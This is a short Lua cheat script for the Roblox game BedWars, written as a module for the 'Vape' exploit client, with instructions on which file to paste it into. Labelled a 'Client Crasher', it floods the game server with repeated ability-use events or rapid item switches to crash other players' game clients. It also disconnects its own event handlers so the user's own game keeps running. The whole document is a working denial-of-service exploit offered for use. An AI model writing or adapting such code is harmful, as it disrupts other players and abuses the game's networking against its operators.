--[[
BEDWARS CLIENT CRASHER + ANTICRASH
-----------------------------------
PASTE THIS SCRIPT UNDER THE FILE:
"6872274481.lua" AT THE BOTTOM.
YOU CAN USE ANY VAPE SCRIPT/CONFIG
]]
run(function()
    local ClientCrasher
    local Method

    ClientCrasher = vape.Categories.Minigames:CreateModule({
        Name = 'Client Crasher',
        Function = function(call)
            if call then
                for _, v in getconnections(game:GetService("ReplicatedStorage"):WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("abilityUsed").OnClientEvent) do
                    v:Disconnect()    
                end

                ClientCrasher:Clean(collectionService:GetInstanceAddedSignal('inventory-entity'):Connect(function(player: Model)
                    local item = player:WaitForChild('HandInvItem') :: IntValue?
                    for i,v in getconnections(item.Changed) do
                        v:Disable()
                    end                
                end))

                repeat
                    if entitylib.isAlive then
                        if Method.Value == 'Ability' then
                            for _ = 1, 25 do
                                replicatedStorage['events-@easy-games/game-core:shared/game-core-networking@getEvents.Events'].useAbility:FireServer('oasis_swap_staff')
                            end
                            task.wait(0.1)
                        elseif Method.Value == 'Item' then
                            for _, tool in store.inventory.inventory.items do
                                task.spawn(switchItem, tool.tool, 0, true)
                            end
                        end
                    end
                    task.wait()
                until not ClientCrasher.Enabled
            end
        end
    })

    Method = ClientCrasher:CreateDropdown({
        Name = 'Method',
        List = {'Item', 'Ability'}
    })
end)
